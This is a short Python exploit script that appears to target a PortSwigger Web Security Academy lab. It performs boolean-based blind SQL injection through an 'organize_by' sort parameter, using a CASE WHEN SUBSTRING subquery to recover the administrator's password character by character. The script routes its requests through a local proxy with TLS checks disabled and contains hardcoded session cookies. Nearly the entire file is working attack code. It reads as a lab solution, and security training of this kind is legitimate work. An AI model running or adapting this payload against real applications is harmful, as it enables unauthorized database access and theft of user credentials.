from pwn import *
import requests
import string
from urllib.parse import quote
import urllib3

# config
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
host = "0a8b008c035c659880b50d7e00b60085.web-security-academy.net"
base_url = f"https://{host}/advanced_search"
cookies = {
    "_lab": "47%7cMC0CFQCPSaGz0fbnm9uid%2ftgx1vJEGKAggIUOBOJz9wlvfFoAVmHS44v94Sy3OUDlTYe76xmDMoUVE%2f5%2flOuCHplRLfczGOpfS%2bxOivdYI3Cbi6S18ZexjDEeO3yW2xKDYRPmmr2IAnp%2fjJdOnYKBM4ap6Qml7pw8GZTNmahlxTxymGy",
    "session": "yfGpsVqKEh5d86rlHCGfBrYdanyAJvPB"
}
true_marker = '''<section class=blog-list>
                        <div class="blog-post">
                        <a href="/post?postId=7">'''
alphabet = string.ascii_letters + string.digits + "!@#$%^&*_."
max_len = 16
username = "administrator"
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

extracted = ""

for i in range(1, max_len + 1):
    found = False
    for ch in alphabet:
        payload = (
            f"CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='{username}'),"
            f"{i},1)='{ch}' THEN title::text ELSE id::text END"
        )
        url = f"{base_url}?SearchTerm=test&organize_by={quote(payload, safe='')}&blogArtist="

        try:
            res = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
            if true_marker in res.text:
                extracted += ch
                log.success(f"[{i}] = {ch} → {extracted}")
                found = True
                break
        except Exception as e:
            log.error(f"Request failed: {e}")
            break

    if not found:
        log.warning(f"[{i}] = ? (no match)")
        extracted += "?"

log.success(f"Final password: {extracted}")
